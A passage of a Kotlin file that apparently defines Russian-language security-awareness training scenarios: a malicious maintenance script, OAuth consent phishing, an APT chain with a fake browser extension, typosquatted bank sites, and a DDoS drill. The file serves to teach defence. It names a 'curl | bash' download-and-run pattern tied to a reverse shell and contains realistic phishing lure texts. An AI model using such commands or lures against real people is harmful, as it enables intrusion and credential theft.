                    emailSubject = "prod-app-01.corp.local",
                    emailFrom = "d.korolev@devops-corp-team.ru",
                    pressureSeconds = 90,
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "tts-2-curl",
                            title = "curl … | bash",
                            body = "Паттерн загружает и немедленно выполняет удалённый скрипт без сохранения на диск. Классическая техника MITRE ATT&CK T1059.004: одна строка — полный контроль над хостом.",
                        ),
                        InternalInvestigationPanel(
                            id = "tts-2-ip",
                            title = "IP 185.220.101.47",
                            body = "Известная Tor exit-нода (AbuseIPDB, Shodan). Ни один легитимный инструмент мониторинга не размещается на Tor exit-нодах — это признак C2-инфраструктуры.",
                        ),
                        InternalInvestigationPanel(
                            id = "tts-2-amp",
                            title = "Символ & в конце команды",
                            body = "Запускает процесс в фоне. Даже если основной скрипт завершится, фоновый reverse shell продолжит работать незаметно — его не видно в стандартном логе заданий.",
                        ),
                    ),
                    investigationBonusThreshold = 2,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "tts-2-run",
                            label = "sudo bash maintenance.sh",
                            choiceId = "tts-2-a",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "tts-2-block",
                            label = "Заблокировать — создать инцидент ИБ",
                            choiceId = "tts-2-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "tts-2-edit",
                            label = "Удалить строку 20 и запустить остаток",
                            choiceId = "tts-2-c",
                            variant = "ACTION",
                        ),
                    ),
                    choices = listOf(
                        InternalChoice(
                            id = "tts-2-a",
                            label = "Запущу скрипт — одна подозрительная строка не страшно",
                            correct = false,
                            explanationWhenChosen = "curl -s ... | bash выполняет произвольный код немедленно, в фоне, без следов на диске. Одна строка — достаточно для полного компрометирования хоста.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Reverse shell установлен. IP 185.220.101.47 — Tor exit-нода. Злоумышленник получил интерактивный доступ к prod-серверу.",
                        ),
                        InternalChoice(
                            id = "tts-2-b",
                            label = "Не запускаю: curl … | bash с Tor exit-нодой — это reverse shell. Изолирую запрос, создаю инцидент ИБ",
                            correct = true,
                            explanationWhenChosen = "Верно. Сочетание curl | bash + IP Tor exit-ноды — неопровержимый признак бэкдора. Сообщение об инциденте позволит проверить, не запустил ли кто-то из коллег скрипт раньше.",
                            scoreDelta = 6,
                        ),
                        InternalChoice(
                            id = "tts-2-c",
                            label = "Удалю строку 20 и запущу оставшийся скрипт",
                            correct = false,
                            explanationWhenChosen = "Редактировать чужой скрипт перед запуском недостаточно: откуда уверенность, что других вредоносных команд нет? Скрипт доставлен из ненадёжного источника — нужен полный отказ и тикет ИБ.",
                            scoreDelta = 0,
                        ),
                    ),
                ),
            ),
            attackBreakdown = AttackBreakdown(
                summary = "Living-off-the-Land: вредонос маскируется под штатный скрипт обслуживания. Ключевой признак — curl | bash скачивает и сразу выполняет код с внешнего IP.",
                techniques = listOf(
                    AttackTechnique("T1566.001", "Spearphishing Link", "Initial Access",
                        "Письмо с «официальным» скриптом обслуживания от имени коллеги из DevOps."),
                    AttackTechnique("T1059.004", "Unix Shell", "Execution",
                        "Bash-скрипт выполняет произвольные команды на системе под видом обслуживания."),
                    AttackTechnique("T1105", "Ingress Tool Transfer", "Command and Control",
                        "curl -s URL | bash: скачивает и сразу выполняет вредоносный код без сохранения на диск."),
                    AttackTechnique("T1036", "Masquerading", "Defense Evasion",
                        "Вредоносная строка спрятана среди десятков легитимных команд обслуживания."),
                ),
                howToDefend = "Всегда читай скрипты перед запуском. Запрещай curl | bash корпоративной политикой. Верифицируй скрипты через официальный репозиторий, а не личную переписку.",
            ),
        )

        /** OAuth Consent Phishing: приложение запрашивает Mail.Read.All и Files.ReadWrite.All. */
        fun oauthConsentTrap(): InternalScenario = InternalScenario(
            id = "oauth-consent-trap",
            title = "Разреши или откажи",
            type = ScenarioType.EMAIL,
            description = "Корпоративный инструмент запрашивает OAuth-доступ с правами Mail.Read.All и Files.ReadWrite.All. За этим — тихое слежение за всей перепиской компании.",
            attackTypeLabel = "OAuth-фишинг / Consent Phishing",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                // ── Шаг 1: коллега убеждает одобрить ──────────────────────────────────
                InternalStep(
                    id = "oct-1",
                    situationBrief = """
                        В рабочем Telegram коллега Настя говорит, что уже одобрила новый
                        «корпоративный инструмент» и торопит вас сделать то же самое.
                    """.trimIndent(),
                    narrative = """Настя Фёдорова:
Привет! IT внедряет WorkflowSync для интеграции задач с Microsoft 365.
Мне уже пришёл запрос авторизации — одобрила, всё сделалось за 10 секунд 👍

Тебе скоро придёт такое же окно. Просто нажми «Разрешить» —
это официально, нам говорили на стендапе.

Кстати, вот ссылка на случай, если не дождёшься автоматически:
[Авторизовать WorkflowSync]""",
                    uiKind = StepUiKind.CHAT_MESSENGER,
                    simChatTitle = "Настя Фёдорова",
                    simChatSenderLabel = "Настя · Продуктовая команда",
                    pressureSeconds = 50,
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "oct-1-social",
                            title = "Социальное давление «второго источника»",
                            body = "«Я уже одобрила» + «нам говорили на стендапе» — два слоя легитимации. OAuth Consent Phishing часто начинается с компрометации одного аккаунта: жертва создаёт волну доверия для остальных.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "oct-1-link",
                            label = "Авторизовать WorkflowSync",
                            choiceId = "oct-1-a",
                            variant = "LINK",
                        ),
                        InternalHotspot(
                            id = "oct-1-check",
                            label = "Изучить разрешения перед одобрением",
                            choiceId = "oct-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "oct-1-look",
                            label = "Перейти по ссылке и посмотреть",
                            choiceId = "oct-1-c",
                            variant = "ACTION",
                        ),
                    ),
                    choices = listOf(
                        InternalChoice(
                            id = "oct-1-a",
                            label = "Настя уже одобрила — тоже нажму «Разрешить» без лишних проверок",
                            correct = false,
                            explanationWhenChosen = "Слова коллеги «я уже одобрила» не проверяют список разрешений приложения. OAuth-фишинг именно на этом и построен: один «агент доверия» снимает бдительность у остальных.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "WorkflowSync получил OAuth-токен с правами Mail.Read.All. Злоумышленник читает входящие всех авторизовавших сотрудников в реальном времени.",
                        ),
                        InternalChoice(
                            id = "oct-1-b",
                            label = "Не тороплюсь — сначала изучу, какой именно доступ запрашивает приложение",
                            correct = true,
                            explanationWhenChosen = "Правильно. Прежде чем одобрить OAuth-запрос — всегда читайте список разрешений. «Читать ваш профиль» и «читать почту всей организации» — это принципиально разные уровни доступа.",
                            scoreDelta = 4,
                        ),
                        InternalChoice(
                            id = "oct-1-c",
                            label = "Перейду по ссылке, посмотрю что там, и решу",
                            correct = false,
                            explanationWhenChosen = "Это лучше, чем сразу одобрить, но «посмотрю» недостаточно конкретно. Нужна явная проверка списка разрешений с намерением отклонить всё подозрительное.",
                            scoreDelta = 0,
                        ),
                    ),
                ),
                // ── Шаг 2: экран OAuth-согласия ────────────────────────────────────────
                InternalStep(
                    id = "oct-2",
                    situationBrief = """
                        Страница авторизации Microsoft Azure AD. WorkflowSync запрашивает
                        обширный список разрешений. Изучите их внимательно — нажмите
                        «Подробнее о разрешениях» для дополнительного контекста.
                    """.trimIndent(),
                    narrative = """Читать почту всех пользователей организации (Mail.Read.All)
Отправлять письма от имени любого пользователя (Mail.Send.Shared)
Полный доступ к файлам всех сотрудников OneDrive (Files.ReadWrite.All)
Управлять группами и командами Microsoft Teams (Group.ReadWrite.All)
Читать и изменять профили всех аккаунтов (User.ReadWrite.All)
Читать журналы входов и аудита безопасности (AuditLog.Read.All)""",
                    uiKind = StepUiKind.OAUTH_APPROVAL,
                    simExtensionName = "WorkflowSync for Microsoft 365",
                    simExtensionPublisher = "SyncFlow Tech Ltd.",
                    simExtensionBlurb = "Интеграция задач, уведомлений и документов со всеми инструментами Microsoft 365. Повышает продуктивность команды.",
                    pressureSeconds = 55,
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "oct-2-mail",
                            title = "Mail.Read.All + Mail.Send.Shared",
                            body = "Эта комбинация — готовая инфраструктура BEC (Business Email Compromise): полный доступ к входящим ВСЕХ сотрудников + право отправлять письма от их имени. Перехват платёжных поручений, имитация CEO, кража учётных данных.",
                        ),
                        InternalInvestigationPanel(
                            id = "oct-2-principle",
                            title = "Принцип минимальных привилегий",
                            body = "Инструмент для интеграции задач не нуждается в доступе к почте всей организации, OneDrive всех пользователей и журналам аудита. Запрос «всего» — признак либо халтурной разработки, либо злого умысла.",
                        ),
                        InternalInvestigationPanel(
                            id = "oct-2-consent",
                            title = "Consent Phishing (MITRE T1566)",
                            body = "Жертва сама выдаёт OAuth-токен злоумышленнику. MFA не защищает от этого вектора — пользователь уже прошёл аутентификацию. Отзыв: Azure AD → Enterprise Applications → Revoke user consent.",
                        ),
                    ),
                    investigationBonusThreshold = 2,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "oct-2-allow",
                            label = "Разрешить",
                            choiceId = "oct-2-a",
                            variant = "LINK",
                        ),
                        InternalHotspot(
                            id = "oct-2-deny",
                            label = "Отклонить — сообщить в ИБ",
                            choiceId = "oct-2-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "oct-2-exp",
                            label = "Разрешить и посмотреть что будет",
                            choiceId = "oct-2-c",
                            variant = "ACTION",
                        ),
                    ),
                    choices = listOf(
                        InternalChoice(
                            id = "oct-2-a",
                            label = "Разрешить — Настя одобрила, инструмент рабочий",
                            correct = false,
                            explanationWhenChosen = "Mail.Read.All + Mail.Send.Shared = полный доступ к переписке компании + право рассылать письма от имени любого сотрудника. Это BEC-инфраструктура в чистом виде.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Токен выдан. SyncFlow Tech получил постоянный доступ к почте всех авторизовавших. MFA не блокирует OAuth-токены — их нужно отзывать вручную через Azure AD.",
                        ),
                        InternalChoice(
                            id = "oct-2-b",
                            label = "Отклонить: Mail.Read.All и Files.ReadWrite.All — это доступ ко всей переписке и файлам компании. Сообщу в ИБ",
                            correct = true,
                            explanationWhenChosen = "Правильно. Рабочий инструмент для задач не должен запрашивать Mail.Read.All или AuditLog.Read.All — это разрешения уровня глобального администратора. Отчёт в ИБ позволит отозвать токены у коллег, которые уже одобрили.",
                            scoreDelta = 6,
                        ),
                        InternalChoice(
                            id = "oct-2-c",
                            label = "Разрешить и сразу проверить, что приложение делает",
                            correct = false,
                            explanationWhenChosen = "OAuth-токен действует с момента выдачи. «Проверить потом» означает — утечка уже произошла. Любое сомнение в разрешениях — повод для отклонения, не для эксперимента.",
                            scoreDelta = 0,
                        ),
                    ),
                ),
            ),
            attackBreakdown = AttackBreakdown(
                summary = "Consent Phishing (OAuth-фишинг): приложение получает постоянный доступ к почте и файлам через стандартный механизм авторизации. 2FA не спасает.",
                techniques = listOf(
                    AttackTechnique("T1534", "Internal Spearphishing", "Initial Access",
                        "Коллега в мессенджере просит одобрить OAuth-приложение через корпоративный портал."),
                    AttackTechnique("T1528", "Steal Application Access Token", "Credential Access",
                        "Приложение получает OAuth-токен с правами Mail.Read.All и Files.ReadWrite.All — полный доступ к данным."),
                    AttackTechnique("T1550.001", "Use Alternate Authentication Material", "Defense Evasion",
                        "Атакующий использует легитимный OAuth-токен: ни пароль не нужен, ни 2FA не помогает."),
                ),
                howToDefend = "Внимательно читай запрашиваемые OAuth-разрешения. Mail.Read.All или Files.ReadWrite.All от стороннего приложения — всегда отказ. Авторизуй приложения только из корпоративного каталога.",
            ),
        )

        /** APT-цепочка: поддельное письмо от «IT-безопасности» → вредоносное расширение → давление через мессенджер. */
        fun aptSilentAgent(): InternalScenario = InternalScenario(
            id = "apt-silent-agent",
            title = "Операция «Тихий Агент»",
            type = ScenarioType.EMAIL,
            description = "Реалистичная трёхшаговая APT-атака: поддельное письмо от «IT-безопасности», вредоносное расширение браузера с избыточными разрешениями и финальное давление через мессенджер от «коллеги».",
            attackTypeLabel = "APT-цепочка (фишинг → вредоносное расширение → социнженерия)",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                // ── Шаг 1: фишинговое письмо «от IT-безопасности» ──────────────────────────
                InternalStep(
                    id = "apt-sa-1",
                    situationBrief = """
                        Рабочее утро. В корпоративной почте — официально выглядящее письмо
                        от «Отдела ИТ-Безопасности» с требованием срочно установить новое
                        VPN-расширение до 18:00. Тема помечена «ОБЯЗАТЕЛЬНО».
                    """.trimIndent(),
                    narrative = """
                        Уважаемые сотрудники,

                        В рамках обновления политики ИБ (регламент №2024-07) все рабочие
                        станции обязаны установить расширение «VPN Security Bridge» до 18:00
                        сегодняшнего дня. Без него с завтрашнего утра будет закрыт доступ
                        к корпоративным системам и VPN.

                        Установить расширение из официального каталога:
                        [Установить VPN Security Bridge]

                        По вопросам: itsec@corp-vpn-guard.ru
                        С уважением, Отдел ИТ-Безопасности
                    """.trimIndent(),
                    narrativeNoise = "P.S. Если расширение уже установлено — проигнорируйте это сообщение.",
                    uiKind = StepUiKind.EMAIL_CLIENT,
                    emailSubject = "ОБЯЗАТЕЛЬНО: установите VPN Security Bridge до 18:00 (политика ИБ №2024-07)",
                    emailFrom = "Отдел ИТ-Безопасности <itsec-notifications@corp-vpn-guard.ru>",
                    pressureSeconds = 60,
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "apt-sa-1-domain",
                            title = "Домен отправителя",
                            body = "corp-vpn-guard.ru — не корпоративный домен вашей организации. По данным WHOIS зарегистрирован 6 дней назад. Настоящие письма IT приходят с внутреннего домена или через тикет-систему.",
                        ),
                        InternalInvestigationPanel(
                            id = "apt-sa-1-channel",
                            title = "Канал распространения ПО",
                            body = "Легитимные IT-отделы не рассылают требования об установке ПО по email с внешнего домена. Корпоративные расширения распространяются через MDM, GPO или внутренний каталог — не по ссылке в письме.",
                        ),
                    ),
                    investigationBonusThreshold = 2,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "apt-sa-1-install",
                            label = "Ссылка «Установить VPN Security Bridge»",
                            choiceId = "apt-sa-1-a",
                            variant = "LINK",
                        ),
                        InternalHotspot(
                            id = "apt-sa-1-verify",
                            label = "Проверить через официальный helpdesk",
                            choiceId = "apt-sa-1-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "apt-sa-1-reply",
                            label = "Ответить на письмо с вопросом",
                            choiceId = "apt-sa-1-c",
                            variant = "REPLY",
                        ),
                    ),
                    choices = listOf(
                        InternalChoice(
                            id = "apt-sa-1-a",
                            label = "Перейду по ссылке и установлю расширение — это официальное требование ИБ",
                            correct = false,
                            explanationWhenChosen = "Домен отправителя corp-vpn-guard.ru не принадлежит вашей организации. Срочность и «официальный» тон — классические инструменты социальной инженерии для подавления критического мышления.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Ссылка вела на поддельную страницу Chrome Web Store под контролем злоумышленника. Расширение установлено — атакующий получил точку опоры в вашем браузере.",
                        ),
                        InternalChoice(
                            id = "apt-sa-1-b",
                            label = "Остановлюсь: домен отправителя подозрительный — проверю через официальный тикет-портал или позвоню в IT напрямую",
                            correct = true,
                            explanationWhenChosen = "Верно. Проверка через независимый канал — единственный надёжный способ убедиться в легитимности требования. Ни одно настоящее IT-уведомление не должно требовать немедленных действий без возможности проверки.",
                            scoreDelta = 5,
                        ),
                        InternalChoice(
                            id = "apt-sa-1-c",
                            label = "Отвечу на письмо и спрошу, настоящее ли это требование",
                            correct = false,
                            explanationWhenChosen = "Ответ на фишинговое письмо подтверждает активность ящика и может дать злоумышленнику повод для дальнейшей переписки. Проверяйте через независимый канал — не через это письмо.",
                            scoreDelta = 0,
                        ),
                    ),
                ),
                // ── Шаг 2: страница расширения в «магазине» ────────────────────────────────
                InternalStep(
                    id = "apt-sa-2",
                    situationBrief = """
                        Ссылка из письма открыла страницу расширения, внешне похожую на
                        Chrome Web Store. Перед установкой изучите детали: разрешения,
                        издателя, дату и рейтинг.
                    """.trimIndent(),
                    narrative = """
                        Запрашиваемые разрешения:
                        • Читать и изменять все ваши данные на всех сайтах
                        • Управлять загрузками файлов
                        • Читать и изменять содержимое буфера обмена
                        • Получить доступ к данным браузера (история, вкладки)

                        Опубликовано: 3 дня назад · 47 оценок · ★★★★★ (5.0)
                        Пользователей: 312
                    """.trimIndent(),
                    uiKind = StepUiKind.EXTENSION_STORE,
                    simExtensionName = "VPN Security Bridge — Corporate",
                    simExtensionPublisher = "Corp IT Solutions Ltd.",
                    simExtensionBlurb = "Официальное VPN-расширение для корпоративных пользователей. Защита соединения, туннелирование трафика и мониторинг угроз в реальном времени.",
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "apt-sa-2-perms",
                            title = "Разрешения расширения",
                            body = "«Читать и изменять все данные на всех сайтах» — максимально опасное разрешение: позволяет перехватывать сессии, куки и пароли на любом сайте. Легитимный VPN-клиент не нуждается в доступе к содержимому веб-страниц.",
                        ),
                        InternalInvestigationPanel(
                            id = "apt-sa-2-rating",
                            title = "Дата публикации и рейтинг",
                            body = "3 дня + идеальные 5.0 из 47 отзывов = явная накрутка. Корпоративные расширения с реальной аудиторией имеют неидеальный рейтинг и историю обновлений — не появляются в один день с сотнями пользователей.",
                        ),
                        InternalInvestigationPanel(
                            id = "apt-sa-2-publisher",
                            title = "Издатель",
                            body = "'Corp IT Solutions Ltd.' — нет значка верификации разработчика, нет ссылки на домен организации, нет страницы политики конфиденциальности. Корпоративные расширения публикуются под верифицированным аккаунтом компании.",
                        ),
                    ),
                    investigationBonusThreshold = 2,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "apt-sa-2-install",
                            label = "Установить расширение",
                            choiceId = "apt-sa-2-a",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "apt-sa-2-block",
                            label = "Не устанавливать — сообщить в ИБ",
                            choiceId = "apt-sa-2-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "apt-sa-2-temp",
                            label = "Установить и сразу удалить для проверки",
                            choiceId = "apt-sa-2-c",
                            variant = "ACTION",
                        ),
                    ),
                    choices = listOf(
                        InternalChoice(
                            id = "apt-sa-2-a",
                            label = "Установлю — описание официальное, издатель указан",
                            correct = false,
                            explanationWhenChosen = "Описание легко подделать. Три дня жизни, идеальный рейтинг и разрешение «читать все данные» — совокупность красных флагов, которые перевешивают любой «официальный» текст.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Расширение перехватило корпоративный сессионный токен из cookies браузера. Злоумышленник теперь может входить в корп-системы под вашим именем без пароля. Срочно: завершить все сессии, сменить пароль, уведомить ИБ.",
                        ),
                        InternalChoice(
                            id = "apt-sa-2-b",
                            label = "Не устанавливаю: новый издатель без верификации, избыточные разрешения, подозрительный рейтинг — сообщу в ИБ",
                            correct = true,
                            explanationWhenChosen = "Правильно. Минимальные права, проверенный издатель и история публикаций — обязательные критерии для любого корпоративного расширения. Сообщение в ИБ позволит заблокировать атаку для всей организации.",
                            scoreDelta = 5,
                        ),
                        InternalChoice(
                            id = "apt-sa-2-c",
                            label = "Установлю ненадолго — посмотрю, что делает, потом удалю",
                            correct = false,
                            explanationWhenChosen = "Вредоносное расширение действует мгновенно: перехват сессий и кража токенов происходят при первом же открытии корпоративного сайта. Удаление не отменяет утечку данных, которая уже произошла.",
                            scoreDelta = 0,
                        ),
                    ),
                ),
                // ── Шаг 3: «коллега» в мессенджере создаёт социальное давление ────────────
                InternalStep(
                    id = "apt-sa-3",
                    situationBrief = """
                        Пока вы изучали страницу расширения, в рабочем Telegram пришло
                        сообщение от «Антона из IT». Он подтверждает, что уже установил
                        расширение, и торопит вас.
                    """.trimIndent(),
                    narrative = """
                        Антон Смирнов:
                        Привет! Видел письмо от ИБ про VPN-расширение? Я уже поставил —
                        всё работает нормально 👍 Директор лично сказал, что сегодня
                        обязательно, иначе доступ к корп-системам закроют до завтра.

                        Вот ссылка ещё раз, если потерял:
                        [Установить VPN Security Bridge]

                        Долго не тяни, уже половина отдела поставила.
                    """.trimIndent(),
                    uiKind = StepUiKind.CHAT_MESSENGER,
                    simChatTitle = "Антон · IT-отдел",
                    simChatSenderLabel = "Антон Смирнов · IT-отдел",
                    pressureSeconds = 45,
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "apt-sa-3-pressure",
                            title = "Двухканальное давление",
                            body = "Скоординированная атака через email + мессенджер — признак APT-группы. Второй «источник» создаёт иллюзию социального подтверждения. Настоящий IT-отдел не рассылает требования через личный Telegram и не ссылается на «слова директора».",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    hotspots = listOf(
                        InternalHotspot(
                            id = "apt-sa-3-install",
                            label = "Установить — коллега подтвердил, что всё ок",
                            choiceId = "apt-sa-3-a",
                            variant = "LINK",
                        ),
                        InternalHotspot(
                            id = "apt-sa-3-report",
                            label = "Сообщить в ИБ о скоординированной атаке",
                            choiceId = "apt-sa-3-b",
                            variant = "ACTION",
                        ),
                        InternalHotspot(
                            id = "apt-sa-3-call",
                            label = "Позвонить Антону и тогда решить",
                            choiceId = "apt-sa-3-c",
                            variant = "ACTION",
                        ),
                    ),
                    choices = listOf(
                        InternalChoice(
                            id = "apt-sa-3-a",
                            label = "Раз коллега из IT говорит, что всё ок — установлю расширение",
                            correct = false,
                            explanationWhenChosen = "Социальная инженерия работает именно так: второй «авторитетный» голос преодолевает оставшиеся сомнения. Аккаунт «Антона» мог быть скомпрометирован или создан злоумышленником заранее.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Атака завершена успешно. Злоумышленник использовал два канала давления (email + мессенджер), чтобы обойти вашу осторожность. Это классическая схема APT-групп против корпоративных сетей.",
                        ),
                        InternalChoice(
                            id = "apt-sa-3-b",
                            label = "Это двухканальная атака: письмо + мессенджер — немедленно сообщаю в ИБ со скриншотами обоих сообщений",
                            correct = true,
                            explanationWhenChosen = "Отлично. Скоординированная атака через два канала — признак целенаправленной APT-операции. Своевременный отчёт в ИБ позволит заблокировать угрозу для всей компании и, возможно, спасти коллег, которых ещё не успели атаковать.",
                            scoreDelta = 6,
                        ),
                        InternalChoice(
                            id = "apt-sa-3-c",
                            label = "Позвоню Антону по телефону — если это он, то установлю",
                            correct = false,
                            explanationWhenChosen = "Голосовая проверка — лучше, чем молчаливое согласие, но недостаточно: злоумышленники могут готовиться к звонку или использовать дипфейк-голос. Правильный ответ — вообще не устанавливать и сообщить в ИБ, а не искать «разрешения» установки по другому каналу.",
                            scoreDelta = 0,
                        ),
                    ),
                ),
            ),
            attackBreakdown = AttackBreakdown(
                summary = "Трёхшаговая APT-цепочка: письмо → браузерное расширение → давление через мессенджер. Два канала одновременно — признак скоординированной атаки.",
                techniques = listOf(
                    AttackTechnique("T1566.001", "Spearphishing Link", "Initial Access",
                        "Поддельное письмо от «IT-безопасности» с домена-тайпсквота corp-vpn-guard.ru (зарегистрирован 6 дней назад)."),
                    AttackTechnique("T1176", "Browser Extensions", "Persistence",
                        "Вредоносное расширение с правами «читать все данные на всех сайтах» перехватывает сессии и куки."),
                    AttackTechnique("T1534", "Internal Spearphishing", "Collection",
                        "Скоординированное давление через Telegram: «коллега» подтверждает легитимность расширения."),
                ),
                howToDefend = "Проверяй возраст домена отправителя. Никогда не устанавливай расширения по письмам — только через официальный корпоративный магазин. Запросы ИТ верифицируй через внутренние тикеты, не Telegram.",
            ),
        )

        /** Поисковая выдача: выбрать официальный сайт по домену (не «сравнение двух URL»). */
        fun searchBankOfficialSerp(): InternalScenario = InternalScenario(
            id = "search-bank-official-serp",
            title = "Поиск: какой сайт банка настоящий",
            type = ScenarioType.EMAIL,
            description = "Вы ввели запрос в поисковике и видите несколько похожих сниппетов. Нужно открыть именно официальный ресурс по домену.",
            attackTypeLabel = "Typosquatting / поддельный сайт в выдаче",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                InternalStep(
                    id = "sbs-1",
                    situationBrief = """
                        Вы хотите зайти в интернет-банк «Банк Центр-инвест» и в поисковой строке набрали что-то вроде
                        «центр инвест личный кабинет». Ниже — учебная выдача: кликните по тому результату, которому
                        доверили бы на практике (ориентир — официальный домен организации, а не «похожее» название).
                    """.trimIndent(),
                    narrative = """
                        Проверьте заголовок, строку ссылки и сниппет. Официальный публичный сайт этого банка в РФ —
                        centrinvest.ru (без лишних слов «login», «online» в домене и без опечаток в написании).
                        Остальные варианты в списке — учебные подделки для тренировки внимательности.
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "sbs-1-a",
                            label = "Результат: centr-invest-login.ru",
                            correct = false,
                            explanationWhenChosen = "Домен выглядит «банковским», но это не centrinvest.ru. Отдельный домен со словом login часто используют в фишинге.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Вы могли попасть на поддельную форму входа. В реальности — закрыть вкладку, проверить домен по карте/договору и зайти через закладку или приложение банка.",
                        ),
                        InternalChoice(
                            id = "sbs-1-b",
                            label = "Результат: centrinvestt.ru",
                            correct = false,
                            explanationWhenChosen = "Опечатка в домене (лишняя буква) — классический typosquatting. Визуально почти как оригинал, но это другой сайт.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Поддельная страница могла перехватить ввод. Сообщите в банк по официальному номеру и смените пароль, если что-то вводили.",
                        ),
                        InternalChoice(
                            id = "sbs-1-c",
                            label = "Результат: www.centrinvest.ru",
                            correct = true,
                            explanationWhenChosen = "Верно: домен centrinvest.ru совпадает с официальным публичным сайтом банка. При сомнениях всё равно лучше открывать банк из приложения или сохранённой закладки, а не из первой строки выдачи.",
                            scoreDelta = 5,
                        ),
                        InternalChoice(
                            id = "sbs-1-d",
                            label = "Результат: www-centrinvest.com",
                            correct = false,
                            explanationWhenChosen = "Составной домен с дефисом и зона .com — типичный шаблон подделки. Официальный домен банка — centrinvest.ru.",
                            scoreDelta = 0,
                            criticalIfWrong = true,
                            consequenceBeat = "Сторонний домен мог вести на фишинг. Не вводите реквизиты на таких страницах.",
                        ),
                    ),
                    uiKind = StepUiKind.SEARCH_ENGINE_RESULTS,
                    investigationPanels = listOf(
                        InternalInvestigationPanel(
                            id = "sbs-1-hint",
                            title = "Как сверять домен",
                            body = "Ищите корневой домен второго уровня: centrinvest.ru. Поддомены вроде ib.centrinvest.ru могут быть легитимными, если корень совпадает. Подозрительно: другой корень, опечатка, слова secure/login/bank в корне.",
                        ),
                    ),
                    investigationBonusThreshold = 1,
                    serpPickGame = InternalSerpPickGame(
                        query = "центр инвест личный кабинет официальный",
                        results = listOf(
                            InternalSerpResult(
                                title = "Вход в интернет-банк — Центр Инвест (обновление 2025)",
                                displayUrl = "https://centr-invest-login.ru/ib",
                                snippet = "Быстрый вход в личный кабинет. Подтвердите личность по SMS за 30 секунд. Работаем 24/7.",
                                choiceId = "sbs-1-a",
                            ),
                            InternalSerpResult(
                                title = "Centrinvest — официальный кабинет клиента",
                                displayUrl = "https://centrinvestt.ru/lk",
                                snippet = "Личный кабинет физлица: карты, вклады, переводы. Войти без очереди.",
                                choiceId = "sbs-1-b",
                            ),
                            InternalSerpResult(
                                title = "Банк Центр-инвест — личный кабинет",
                                displayUrl = "https://www.centrinvest.ru/page/ibank.htm",
                                snippet = "Интернет-банк для частных клиентов. Вход по логину и паролю на официальном сайте кредитной организации.",
                                choiceId = "sbs-1-c",
                            ),
                            InternalSerpResult(
                                title = "CENTER INVEST — secure client portal",
                                displayUrl = "https://www-centrinvest.com/login",
                                snippet = "Official-looking portal. Verify your device to continue. English support.",
                                choiceId = "sbs-1-d",
                            ),
                        ),
                    ),
                    pressureSeconds = 70,
                ),
            ),
            attackBreakdown = AttackBreakdown(
                summary = "Typosquatting и SEO-отравление: поддельный домен банка продвигается в поисковой выдаче выше официального.",
                techniques = listOf(
                    AttackTechnique("T1583.001", "Acquire Infrastructure: Domains", "Resource Development",
                        "Атакующий регистрирует тайпсквот-домены, визуально имитирующие официальный сайт банка."),
                    AttackTechnique("T1608.006", "Stage Capabilities: SEO Poisoning", "Initial Access",
                        "Поддельный сайт продвигается в поисковой выдаче выше официального через платную рекламу или SEO."),
                ),
                howToDefend = "Не ищи сайт банка через поисковик по общему запросу. Официальный адрес — в приложении, на карте или в договоре. Обращай внимание на значок рекламы в выдаче.",
            ),
        )

        /** Периметр: учебная DDoS, разрыв только вредоносных потоков с учётом белого списка доменов. */
        fun perimeterDdosNetShield(): InternalScenario = InternalScenario(
            id = "perimeter-ddos-net-shield",
            title = "Периметр: волна запросов (DDoS)",
            type = ScenarioType.EMAIL,
            description = "Консоль защиты показывает всплеск соединений. Нужно разорвать сессии с явно вредоносных узлов, не трогая легитимный трафик к известным сервисам.",
            attackTypeLabel = "DDoS / перегрузка периметра",
            hubChannel = ScenarioHubChannel.SECURITY,
            steps = listOf(
                InternalStep(
                    id = "pdn-1",
                    situationBrief = """
                        Вы дежурный по сети. На пограничном узле сработала сигнализация: резкий рост входящих соединений.
                        Открыта учебная консоль «NetShield»: таблица активных потоков. Часть трафика — обычный фон
                        (API карт, обновления, госсервисы), часть — похожа на ботнет к несуществующему у вас хосту.
                    """.trimIndent(),
                    narrative = """
                        Доверенные направления (не блокируйте без тикета в ИБ, если нет прямого приказа):
                        хосты в зонах yandex.ru, vk.com, microsoft.com, gosuslugi.ru, cloudflare.com —
                        у пользователей это типичный легитимный трафик.

                        Задача: нажать «Разорвать сессию» ровно у того потока, который с наибольшей вероятностью
                        является учебной атакой на ваш периметр (чужой домен, аномально высокий rate, не ваш сервис).
                    """.trimIndent(),
                    choices = listOf(
                        InternalChoice(
                            id = "pdn-1-a",
                            label = "Разорвать поток к api-maps.yandex.ru",
                            correct = false,
